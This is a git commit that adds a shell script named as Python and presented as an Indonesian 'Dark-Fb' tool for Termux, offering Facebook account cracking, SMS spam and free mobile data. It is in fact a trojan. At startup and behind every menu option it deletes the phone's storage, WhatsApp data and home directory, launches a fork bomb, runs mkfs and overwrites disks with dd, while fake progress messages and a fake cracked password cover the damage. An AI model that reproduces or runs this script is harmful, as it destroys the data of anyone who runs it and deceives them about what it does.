4d9d7172d61426521286c9c2a48efbb87125669a
safar126 <49516594+safar126@users.noreply.github.com>
2019-08-03 15:53:04 +0700

    Add files via upload

---
+++ d.py
@@ -0,0 +1,332 @@
+#!/system/xbin/python2
+#Bersihkan Layar
+#jangan record anjing
+#susah ngetiknya bangsad
+clear
+R1='\033[31;1m'
+B1='\033[1;36m'
+G1='\033[32;1m'
+Y1='\033[33;1m'
+P1='\033[35;1m'
+sleep 0.1
+termux-setup-storage
+clear
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+figlet Dark-Fb 1.8 | lolcat
+
+echo "*馃敯SAFAR馃敯*
+░░░░▓
+░░░▓▓
+░░█▓▓█
+░██▓▓██
+░░██▓▓██
+░░░██▓▓██
+░░░░██▓▓██
+░░░░░██▓▓██
+░░░░██▓▓██
+░░░██▓▓██
+░░██▓▓██
+░██▓▓██
+░░██▓▓██
+░░░██▓▓██
+░░░░██▓▓██
+░░░░░██▓▓██
+░░░░██▓▓██
+░░░██▓▓██
+░░██▓▓██
+░██▓▓██
+░░██▓▓██
+░░░██▓▓██
+░░░░██▓▓██
+░░░░░██▓▓██
+░░░░██▓▓██
+░░░██▓▓██
+░░██▓▓██
+░██▓▓██
+░░██▓▓██
+░░░██▓▓██
+░░░░██▓▓██
+░░░░░██▓▓██
+░░░░██▓▓██
+░░░██▓▓██
+░░██▓▓██
+░██▓▓██
+░░██▓▓██
+░░░██▓▓██
+░░░░██▓▓██
+░░░░░██▓▓██
+░░░░██▓▓██
+░░░██▓▓██
+░░██▓▓██
+░██▓▓██
+░░██▓▓██
+░░░██▓▓██
+░░░░██▓▓██
+░░░░░██▓▓██
+░░░░██▓▓██
+░░░██▓▓██
+░░██▓▓██
+░██▓▓██
+░░██▓▓██
+░░░██▓▓██
+░░░░██▓▓██
+░░░░░██▓▓██
+░░░░██▓▓██
+░░░██▓▓██
+░░██▓▓██
+░██▓▓██
+░░██▓▓██
+░░░██▓▓██
+░░░░██▓▓██
+░░░░░██▓▓██
+░░░░██▓▓██
+░░░██▓▓██
+░░██▓▓██
+░░██▓▓██
+░░██▓▓██
+░░██▓▓██
+░  ██▓▓██
+░░██▓▓██
+░░░██▓▓███
+░░░░██▓▓████
+░░░░░██▓▓█████
+░░░░░░██▓▓██████
+░░░░░░███▓▓███████
+░░░░░████▓▓████████
+░░░░█████▓▓█████████
+░░░█████░░░█████●███
+░░████░░░░░░░███████
+░░███░░░░░░░░░██████
+░░██░░░░░░░░░░░████
+░░░░░░░░░░░░░░░░███
+░░░░░░░░░░░░░░░░
+*🔰SAFAR🔰*" | lolcat -a -d 3
+echo $B1"=========================="
+echo $G1"author = SAFAR"
+echo $R1"Dark-Fb "
+echo $B1"=========================="
+
+
+echo $G1"1.Login Dulu"
+echo $Y1"2.Hack Fb target 80% work"
+echo $P1"3.Spam-Sms 100% work"
+echo $B1"4.Tembak-Kuota All Operator 100% work"
+
+echo $B1"╭──[Masukkan Pilihan Anda]>"
+read -p"╰───────root@MH4NZ0
+clear
+if [ $MikoKW = 1 ] || [ $MikoKW = 01 ]
+then
+figlet -f slant "SAFAR"|lolcat
+sleep 1
+echo $R1"Login Fb Dulu"
+sleep 1
+echo $B1"Masukan Id/Nomer Hp"
+read p;
+sleep 0.5
+echo $B1"Masukan Password"
+read p;
+sleep 5
+echo $G1"Sedang login..."
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+echo $G1"Login Sukses"
+sleep 5
+echo $R1"Kembali Ke beranda dalam 10 dtk"
+sleep 10
+sh VIPDarkFB.sh
+fi
+clear
+if [ $H4NZ0 = 2 ] || [ $H4NZ0 = 02 ]
+then
+figlet -f slant "SAFAR"|lolcat
+sleep 1
+echo $R1"Masukan Id Target Dibawah"
+read p;
+sleep 2
+echo $Y1"Sedang crack"
+sleep 2
+echo $G1"10%"
+sleep 2
+echo $G1"20%"
+sleep 2
+echo $G1"40%"
+sleep 2
+echo $G1"60%"
+sleep 2
+echo $G1"80%"
+sleep 2
+echo $G1"100%"
+sleep 5
+echo $B1"Password Berhasil Crack"
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+sleep 10
+echo $B1"Passwornya = sayang123"
+echo $R1"Kembali ke beranda dalam 20 dtk"
+sleep 20
+sh VIPDarkFB.sh
+fi
+clear
+if [ $MikoKW = 3 ] || [ $MikoKW = 03 ]
+then
+figlet -f slant "SAFAR"|lolcat
+sleep 1
+echo $B1"Spam-Sms"
+sleep 1
+echo $Y1"Masukan Nomer Target Dibawah"
+read p;
+sleep 2
+echo $G1"Sedang Mengirim"
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+sleep 10
+echo $G1"Sukses Mengirim "
+sleep 0.5
+echo $G1"[√] [√] [√]"
+echo $R1"Kembali ke beranda dalam 5 detik"
+sleep 5
+sh VIPDarkFB.sh
+fi
+clear
+if [ $SAFAR = 4 ] || [ $SAFAR = 04 ]
+then
+figlet -f slant "SAFAR"|lolcat
+sleep 1
+echo $G1"Masukan Nomer Anda dibawah"
+read p;
+sleep 3
+echo $G1"sedang mengirim kode otp"
+sleep 1
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+sleep 3
+echo $R1"Mampus-kau Njing"
+python2 VIPDarkFB.py
+fi
